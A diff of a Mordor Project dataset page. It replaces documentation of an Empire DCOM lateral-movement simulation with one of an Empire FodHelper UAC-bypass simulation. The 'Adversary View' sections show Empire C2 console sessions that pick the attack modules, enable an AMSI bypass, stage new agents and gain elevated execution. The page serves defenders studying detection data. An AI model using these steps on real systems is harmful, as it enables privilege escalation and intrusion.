@@ -5,7 +5,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
   <head>
     <meta charset="utf-8" />
-    <title>Empire Invoke DCOM &#8212; The Mordor Project</title>
+    <title>Empire UAC Shell API FodHelper &#8212; The Mordor Project</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
     <link href="../../../../_static/css/index.css" rel="stylesheet">
     <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
@@ -36,22 +36,22 @@
         const thebe_selector_output = ".output,.cell_output"
     </script>
     <script async="async" src="../../../../_static/sphinx-thebe.js"></script>
-    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/02_execution/SDWIN-190518211052.html" />
+    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/04_privilege_escalation/SDWIN-200904032946.html" />
     <link rel="shortcut icon" href="../../../../_static/favicon.ico"/>
     <link rel="index" title="Index" href="../../../../genindex.html" />
     <link rel="search" title="Search" href="../../../../search.html" />
-    <link rel="next" title="WMIC Add User Backdoor" href="SDWIN-190518231333.html" />
-    <link rel="prev" title="Empire Invoke WMI" href="SDWIN-190518214442.html" />
+    <link rel="next" title="Empire Invoke Runas" href="SDWIN-190518204300.html" />
+    <link rel="prev" title="Privilege Escalation" href="privilege_escalation.html" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="docsearch:language" content="en">
 
 
 <!-- Opengraph tags -->
-<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/02_execution/SDWIN-190518211052.html" />
+<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/04_privilege_escalation/SDWIN-200904032946.html" />
 <meta property="og:type"        content="article" />
-<meta property="og:title"       content="Empire Invoke DCOM" />
-<meta property="og:description" content="Empire Invoke DCOM  Metadata          id  SDWIN-190518211052  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/05/18  platform  Windows  Mordor Envir" />
+<meta property="og:title"       content="Empire UAC Shell API FodHelper" />
+<meta property="og:description" content="Empire UAC Shell API FodHelper  Metadata          id  SDWIN-200904032946  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2020/09/04  platform  Windows  " />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary" />
@@ -140,63 +140,63 @@
    Windows
   </a>
   <ul class="current">
-   <li class="toctree-l2 current active">
-    <a class="reference internal" href="execution.html">
+   <li class="toctree-l2">
+    <a class="reference internal" href="../02_execution/execution.html">
      Execution
     </a>
-    <ul class="current">
+    <ul>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191027042312.html">
+      <a class="reference internal" href="../02_execution/SDWIN-191027042312.html">
        Covenant Grunt Msbuild
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518211456.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518211456.html">
        Empire Invoke PSRemoting
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518215622.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518215622.html">
        Empire Invoke WMI Debugger
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518214442.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518214442.html">
        Empire Invoke WMI
       </a>
      </li>
-     <li class="toctree-l3 current active">
-      <a class="current reference internal" href="#">
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-190518211052.html">
        Empire Invoke DCOM
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518231333.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518231333.html">
        WMIC Add User Backdoor
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200724174200.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200724174200.html">
        WMI Event Subscription
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518210652.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518210652.html">
        Empire Invoke PsExec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518213907.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518213907.html">
        Empire Invoke Msbuild
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518182022.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518182022.html">
        Empire Launcher VBS
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191027223020.html">
+      <a class="reference internal" href="../02_execution/SDWIN-191027223020.html">
        Covenant InstallUtil
       </a>
      </li>
@@ -239,38 +239,38 @@
      </li>
     </ul>
    </li>
-   <li class="toctree-l2">
-    <a class="reference internal" href="../04_privilege_escalation/privilege_escalation.html">
+   <li class="toctree-l2 current active">
+    <a class="reference internal" href="privilege_escalation.html">
      Privilege Escalation
     </a>
-    <ul>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../04_privilege_escalation/SDWIN-200904032946.html">
+    <ul class="current">
+     <li class="toctree-l3 current active">
+      <a class="current reference internal" href="#">
        Empire UAC Shell API FodHelper
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518204300.html">
+      <a class="reference internal" href="SDWIN-190518204300.html">
        Empire Invoke Runas
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518184306.html">
+      <a class="reference internal" href="SDWIN-190518184306.html">
        Empire Elevated WMI Subscription
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518221344.html">
+      <a class="reference internal" href="SDWIN-190518221344.html">
        Empire DLL Injection
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518200432.html">
+      <a class="reference internal" href="SDWIN-190518200432.html">
        Empire PSInject
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../04_privilege_escalation/SDWIN-190403133337.html">
+      <a class="reference internal" href="SDWIN-190403133337.html">
        SCM and Dll Hijacking IKEEXT
       </a>
      </li>
@@ -646,7 +646,7 @@
         <!-- ipynb file if we had a myst markdown file -->
         
         <!-- Download raw file -->
-        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/02_execution/SDWIN-190518211052.ipynb"><button type="button"
+        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/04_privilege_escalation/SDWIN-200904032946.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                 data-placement="left">.ipynb</button></a>
         <!-- Download PDF via print -->
@@ -666,10 +666,10 @@
                 data-toggle="tooltip" data-placement="left" title="Source repository"><i
                     class="fab fa-github"></i>repository</button></a>
         <a class="issues-button"
-            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/02_execution/SDWIN-190518211052.html&body=Your%20issue%20content%20here."><button
+            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/04_privilege_escalation/SDWIN-200904032946.html&body=Your%20issue%20content%20here."><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
-        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/02_execution/SDWIN-190518211052.ipynb"><button
+        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/04_privilege_escalation/SDWIN-200904032946.ipynb"><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Edit this page"><i class="fas fa-pencil-alt"></i>suggest edit</button></a>
     </div>
@@ -688,7 +688,7 @@
         aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
     <div class="dropdown-buttons">
         
-        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/02_execution/SDWIN-190518211052.ipynb"><button type="button"
+        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/04_privilege_escalation/SDWIN-200904032946.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
                 data-placement="left"><img class="binder-button-logo"
                     src="../../../../_static/images/logo_binder.svg"
@@ -696,7 +696,7 @@
         
         
         
-        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/02_execution/SDWIN-190518211052.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
+        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/04_privilege_escalation/SDWIN-200904032946.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
                 title="Launch Colab" data-toggle="tooltip" data-placement="left"><img class="colab-button-logo"
                     src="../../../../_static/images/logo_colab.png"
                     alt="Interact on Colab">Colab</button></a>
@@ -764,8 +764,8 @@
         
               <div>
                 
-  <div class="section" id="empire-invoke-dcom">
-<h1>Empire Invoke DCOM<a class="headerlink" href="#empire-invoke-dcom" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="empire-uac-shell-api-fodhelper">
+<h1>Empire UAC Shell API FodHelper<a class="headerlink" href="#empire-uac-shell-api-fodhelper" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="metadata">
 <h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
 <table class="colwidths-auto table">
@@ -776,13 +776,13 @@
 </thead>
 <tbody>
 <tr class="row-even"><td class="text-align:left"><p>id</p></td>
-<td class="text-align:left"><p>SDWIN-190518211052</p></td>
+<td class="text-align:left"><p>SDWIN-200904032946</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>author</p></td>
 <td class="text-align:left"><p>Roberto Rodriguez &#64;Cyb3rWard0g</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>creation date</p></td>
-<td class="text-align:left"><p>2019/05/18</p></td>
+<td class="text-align:left"><p>2020/09/04</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>platform</p></td>
 <td class="text-align:left"><p>Windows</p></td>
@@ -797,91 +797,122 @@
 <td class="text-align:left"><p>Empire</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Simulation Script</p></td>
-<td class="text-align:left"><p>https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1</p></td>
+<td class="text-align:left"><p>https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/privesc/Invoke-FodHelperBypass.ps1</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Dataset</p></td>
-<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_dcom.tar.gz</p></td>
+<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/privilege_escalation/empire_uac_shellapi_fodhelper.zip</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>References</p></td>
-<td class="text-align:left"><p>None</p></td>
+<td class="text-align:left"><p>[‘https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/’]</p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents adversaries executing commands on remote hosts via MMC20.Application COM object over DCOM.</p>
+<p>This dataset represents adversaries elevating privileges (bypassing uac) by performing an registry modification for FodHelper.</p>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">V6W3TH8Y</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">usemodule</span> <span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(Empire: SP7B3U2X) &gt; agents
 
-              <span class="n">Name</span><span class="p">:</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">DCOM</span>
-            <span class="n">Module</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span>
-        <span class="n">NeedsAdmin</span><span class="p">:</span> <span class="kc">False</span>
-        <span class="n">OpsecSafe</span><span class="p">:</span> <span class="kc">True</span>
-          <span class="n">Language</span><span class="p">:</span> <span class="n">powershell</span>
-<span class="n">MinLanguageVersion</span><span class="p">:</span> <span class="mi">2</span>
-        <span class="n">Background</span><span class="p">:</span> <span class="kc">False</span>
-  <span class="n">OutputExtension</span><span class="p">:</span> <span class="kc">None</span>
+[*] Active agents:
 
-<span class="n">Authors</span><span class="p">:</span>
-  <span class="nd">@rvrsh3ll</span>
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            
+SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         1376   5/0.0    2020-09-04 07:12:15  http            
 
-<span class="n">Description</span><span class="p">:</span>
-  <span class="n">Invoke</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">hosts</span> <span class="n">via</span> <span class="n">MMC20</span><span class="o">.</span><span class="n">Application</span> <span class="n">COM</span> <span class="nb">object</span> <span class="n">over</span> <span class="n">DCOM</span><span class="o">.</span>
+(Empire: agents) &gt; interact SP7B3U2X
+(Empire: SP7B3U2X) &gt; 
+(Empire: SP7B3U2X) &gt; usemodule privesc/
+ask                          bypassuac_sdctlbypass        mcafee_sitelist              powerup/service_exe_restore  powerup/write_dllhijacker
+bypassuac                    bypassuac_tokenmanipulation  ms16-032                     powerup/service_exe_stager   printdemon
+bypassuac_env                bypassuac_wscript            ms16-135                     powerup/service_exe_useradd  sherlock
+bypassuac_eventvwr           getsystem*                   powerup/allchecks            powerup/service_stager       tater
+bypassuac_fodhelper          gpp                          powerup/find_dllhijack       powerup/service_useradd      
+(Empire: SP7B3U2X) &gt; usemodule privesc/bypassuac_fodhelper
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; info
 
-<span class="n">Options</span><span class="p">:</span>
+              Name: Invoke-FodHelperBypass
+            Module: powershell/privesc/bypassuac_fodhelper
+        NeedsAdmin: False
+        OpsecSafe: False
+          Language: powershell
+MinLanguageVersion: 2
+        Background: True
+  OutputExtension: None
 
-  <span class="n">Name</span>         <span class="n">Required</span>    <span class="n">Value</span>                     <span class="n">Description</span>
-  <span class="o">----</span>         <span class="o">--------</span>    <span class="o">-------</span>                   <span class="o">-----------</span>
-  <span class="n">Listener</span>     <span class="kc">True</span>                                  <span class="n">Listener</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span>                        
-  <span class="n">CredID</span>       <span class="kc">False</span>                                 <span class="n">CredID</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">store</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span>           
-  <span class="n">ComputerName</span> <span class="kc">True</span>                                  <span class="n">Host</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">stager</span> <span class="n">on</span><span class="p">,</span> <span class="n">comma</span> 
-                                                    <span class="n">separated</span><span class="o">.</span>                              
-  <span class="n">Proxy</span>        <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">Proxy</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span>
-                                                    <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>                              
-  <span class="n">ProxyCreds</span>   <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">Proxy</span> <span class="n">credentials</span>                       
-                                                    <span class="p">([</span><span class="n">domain</span>\<span class="p">]</span><span class="n">username</span><span class="p">:</span><span class="n">password</span><span class="p">)</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> 
-                                                    <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span> <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>      
-  <span class="n">UserAgent</span>    <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">User</span><span class="o">-</span><span class="n">agent</span> <span class="n">string</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">the</span> <span class="n">staging</span>
-                                                    <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span> <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>      
-  <span class="n">Method</span>       <span class="kc">True</span>        <span class="n">ShellWindows</span>              <span class="n">COM</span> <span class="n">method</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span> <span class="n">MMC20</span><span class="o">.</span><span class="n">Application</span><span class="p">,</span><span class="n">She</span>
-                                                    <span class="n">llWindows</span><span class="p">,</span><span class="n">ShellBrowserWindow</span><span class="p">,</span><span class="n">ExcelDDE</span>   
-  <span class="n">Agent</span>        <span class="kc">True</span>        <span class="n">V6W3TH8Y</span>                  <span class="n">Agent</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">on</span><span class="o">.</span>                 
+Authors:
+  Petr Medonos
 
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">Listener</span> <span class="n">https</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">ComputerName</span> <span class="n">IT001</span><span class="o">.</span><span class="n">shire</span><span class="o">.</span><span class="n">com</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">execute</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">V6W3TH8Y</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_CMD_WAIT</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">V6W3TH8Y</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">3</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">agent</span> <span class="n">V6W3TH8Y</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">Completed</span>
+Description:
+  Bypasses UAC by performing an registry modification for
+  FodHelper (based
+  onhttps://winscripting.blog/2017/05/12/first-entry-welcome-
+  and-uac-bypass/)
+
+Comments:
+  https://winscripting.blog/2017/05/12/first-entry-welcome-
+  and-uac-bypass/
+
+Options:
+
+  Name             Required    Value                     Description
+  ----             --------    -------                   -----------
+  Agent            True        SP7B3U2X                  Agent to run module on.                 
+  Listener         True                                  Listener to use.                        
+  Obfuscate        False       False                     Switch. Obfuscate the launcher          
+                                                        powershell code, uses the               
+                                                        ObfuscateCommand for obfuscation types. 
+                                                        For powershell only.                    
+  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
+                                                        Only used if Obfuscate switch is True.  
+                                                        For powershell only.                    
+  AMSIBypass       False       True                      Include mattifestation&#39;s AMSI Bypass in 
+                                                        the stager code.                        
+  AMSIBypass2      False       False                     Include Tal Liberman&#39;s AMSI Bypass in   
+                                                        the stager code.                        
+  UserAgent        False       default                   User-agent string to use for the staging
+                                                        request (default, none, or other).      
+  Proxy            False       default                   Proxy to use for request (default, none,
+                                                        or other).                              
+  ProxyCreds       False       default                   Proxy credentials                       
+                                                        ([domain\]username:password) to use for 
+                                                        request (default, none, or other).      
+
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; set Listener http
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; execute
+[&gt;] Module is not opsec safe, run? [y/N] y
+[*] Tasked SP7B3U2X to run TASK_CMD_JOB
+[*] Agent SP7B3U2X tasked with task ID 2
+[*] Tasked agent SP7B3U2X to run module powershell/privesc/bypassuac_fodhelper
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; 
+Job started: EHNK23
+
+[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
+[*] New agent F2X6GE4R checked in
+[+] Initial agent F2X6GE4R from 172.18.39.5 now active (Slack)
+[*] Sending agent (stage 2) to F2X6GE4R at 172.18.39.5
+
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
+
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            
+SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         1376   5/0.0    2020-09-04 07:30:33  http            
+F2X6GE4R ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         3936   5/0.0    2020-09-04 07:30:34  http            
 
 
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">POWERSHELL</span> <span class="n">stager</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">1</span><span class="p">)</span> <span class="n">to</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">New</span> <span class="n">agent</span> <span class="n">YR1FKZ6A</span> <span class="n">checked</span> <span class="ow">in</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Initial</span> <span class="n">agent</span> <span class="n">YR1FKZ6A</span> <span class="kn">from</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span> <span class="n">now</span> <span class="n">active</span> <span class="p">(</span><span class="n">Slack</span><span class="p">)</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">agent</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">2</span><span class="p">)</span> <span class="n">to</span> <span class="n">YR1FKZ6A</span> <span class="n">at</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span>
-
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">agents</span> 
-
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Active</span> <span class="n">agents</span><span class="p">:</span>
-
-<span class="n">Name</span>     <span class="n">La</span> <span class="n">Internal</span> <span class="n">IP</span>     <span class="n">Machine</span> <span class="n">Name</span>      <span class="n">Username</span>                <span class="n">Process</span>            <span class="n">PID</span>    <span class="n">Delay</span>    <span class="n">Last</span> <span class="n">Seen</span>            <span class="n">Listener</span>
-<span class="o">----</span>     <span class="o">--</span> <span class="o">-----------</span>     <span class="o">------------</span>      <span class="o">--------</span>                <span class="o">-------</span>            <span class="o">---</span>    <span class="o">-----</span>    <span class="o">---------</span>            <span class="o">----------------</span>
-<span class="n">H3DKB8SA</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">nmartha</span>           <span class="n">powershell</span>         <span class="mi">5172</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">59</span>  <span class="n">https</span>           
-<span class="n">TKV35P8X</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="o">*</span><span class="n">SHIRE</span>\<span class="n">nmartha</span>          <span class="n">powershell</span>         <span class="mi">5452</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">59</span>  <span class="n">https</span>           
-<span class="n">EMDBFPSY</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">nmartha</span>           <span class="n">notepad</span>            <span class="mi">7924</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">58</span>  <span class="n">https</span>           
-
-<span class="n">V6W3TH8Y</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">pgustavo</span>          <span class="n">powershell</span>         <span class="mi">5204</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">58</span>  <span class="n">https</span>           
-<span class="n">XSZ91N7T</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.105</span>   <span class="n">IT001</span>             <span class="o">*</span><span class="n">SHIRE</span>\<span class="n">SYSTEM</span>           <span class="n">powershell</span>         <span class="mi">4172</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">58</span>  <span class="n">https</span>           
-<span class="n">EXBNZYTS</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.105</span>   <span class="n">IT001</span>             <span class="o">*</span><span class="n">SHIRE</span>\<span class="n">SYSTEM</span>           <span class="n">powershell</span>         <span class="mi">6728</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">02</span>  <span class="n">https</span>           
-
-<span class="n">YR1FKZ6A</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.105</span>   <span class="n">IT001</span>             <span class="n">SHIRE</span>\<span class="n">pgustavo</span>          <span class="n">powershell</span>         <span class="mi">5228</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">01</span>  <span class="n">https</span>           
-
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span>
+(Empire: agents) &gt; interact F2X6GE4R
+(Empire: F2X6GE4R) &gt; shell whoami
+[*] Tasked F2X6GE4R to run TASK_SHELL
+[*] Agent F2X6GE4R tasked with task ID 1
+(Empire: F2X6GE4R) &gt; 
+theshire\pgustavo
+..Command execution
 </pre></div>
 </div>
 </div>
@@ -902,7 +933,7 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
